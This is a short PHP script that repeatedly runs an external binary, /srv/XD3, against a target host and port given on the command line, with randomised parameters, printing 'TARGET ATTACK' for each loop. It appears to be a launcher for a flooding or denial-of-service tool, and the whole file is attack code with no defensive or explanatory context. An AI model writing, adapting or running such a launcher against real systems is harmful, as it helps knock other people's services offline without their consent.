<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	exec('/srv/XD3 '.$argv[1].' '.$argv[2].' '.$rand.' '.$rand.' 1');
	echo "TARGET ATTACK  ..... ".$argv[1].":".$argv[2]." LOOP $x \n";
}
?>